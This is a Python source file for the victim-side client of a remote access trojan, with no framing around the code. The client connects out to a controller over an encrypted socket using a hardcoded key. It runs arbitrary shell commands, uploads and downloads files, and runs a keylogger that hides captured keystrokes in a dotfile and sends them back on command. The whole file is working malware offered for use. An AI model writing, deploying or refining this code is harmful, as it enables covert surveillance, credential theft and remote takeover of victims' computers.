#!/usr/bin/env python3
import socket
import os
import sys
import threading
import platform
import subprocess
from pynput import keyboard
from cryptography.fernet import Fernet
import struct

# === Shared Encryption Setup ===
FERNET_KEY = b"5QSEoLTqE09epZHZCvqw_QIw4gkx0pLOPY8FkJGK63Q="
cipher = Fernet(FERNET_KEY)

# === Communication helpers ===
def send_encrypted(conn, data_bytes: bytes):
    encrypted = cipher.encrypt(data_bytes)
    length = struct.pack(">I", len(encrypted))
    conn.sendall(length + encrypted)

def recv_encrypted(conn) -> bytes:
    raw_len = b""
    while len(raw_len) < 4:
        chunk = conn.recv(4 - len(raw_len))
        if not chunk:
            raise ConnectionError("Connection closed during length read")
        raw_len += chunk
    msg_len = struct.unpack(">I", raw_len)[0]

    encrypted_msg = b""
    while len(encrypted_msg) < msg_len:
        chunk = conn.recv(msg_len - len(encrypted_msg))
        if not chunk:
            raise ConnectionError("Connection closed during message read")
        encrypted_msg += chunk

    plaintext = cipher.decrypt(encrypted_msg)
    return plaintext

# === Keylogger setup ===
keylog_file = os.path.expanduser("~/.keylog.enc")
keylog_running = False
keylogger_thread = None

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key.name}]"
    try:
        encrypted = cipher.encrypt(key_str.encode())
        with open(keylog_file, "ab") as f:
            f.write(encrypted + b"\n")
    except Exception:
        pass

def run_keylogger():
    global keylog_running
    with keyboard.Listener(on_press=on_press) as listener:
        while keylog_running:
            listener.join(0.1)

def start_keylogger():
    global keylog_running, keylogger_thread
    if keylog_running:
        return
    keylog_running = True
    keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
    keylogger_thread.start()

def stop_keylogger():
    global keylog_running
    keylog_running = False

def decrypt_keylog():
    if not os.path.exists(keylog_file):
        return "[!] No keylog found."
    decrypted = ""
    try:
        with open(keylog_file, "rb") as f:
            for line in f:
                try:
                    decrypted += cipher.decrypt(line.strip()).decode()
                except:
                    decrypted += "[!decrypt error]\n"
    except Exception as e:
        decrypted = f"[!] Failed to decrypt: {e}"
    return decrypted

# === Main victim logic ===
def victim_main(server_ip="127.0.0.1", server_port=1337):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    while True:
        try:
            command_bytes = recv_encrypted(client_socket)
            command = command_bytes.decode(errors="ignore").strip()
        except Exception:
            break

        if not command:
            continue

        if command.lower() == "exit":
            break

        if command.startswith("cd "):
            try:
                path = command[3:].strip()
                os.chdir(path)
                response = f"[+] Changed directory to {os.getcwd()}"
            except Exception as e:
                response = f"[!] Failed to change directory: {str(e)}"
            send_encrypted(client_socket, response.encode())
            continue

        if command.startswith("download "):
            _, filename = command.split(" ", 1)
            if not os.path.exists(filename):
                send_encrypted(client_socket, b"[!] File not found\n__EOF__")
            else:
                with open(filename, "rb") as f:
                    while True:
                        chunk = f.read(16384)
                        if not chunk:
                            break
                        send_encrypted(client_socket, chunk)
                send_encrypted(client_socket, b"__EOF__")
            continue

        if command.startswith("upload "):
            _, filename = command.split(" ", 1)
            with open(filename, "wb") as f:
                while True:
                    chunk = recv_encrypted(client_socket)
                    if chunk == b"__EOF__":
                        break
                    f.write(chunk)
            continue

        if command.lower() == "keylog_start":
            start_keylogger()
            send_encrypted(client_socket, b"[+] Keylogger started")
            continue

        if command.lower() == "keylog_stop":
            stop_keylogger()
            send_encrypted(client_socket, b"[+] Keylogger stopped")
            continue

        if command.lower() == "keylog_dump":
            data = decrypt_keylog().encode()
            send_encrypted(client_socket, data + b"\n__EOF__")
            continue

        # Other commands: run shell commands
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        except Exception as e:
            output = str(e).encode()

        send_encrypted(client_socket, output)

    client_socket.close()

if __name__ == "__main__":
    victim_main("127.0.0.1", 1337)  # Change IP and port as needed
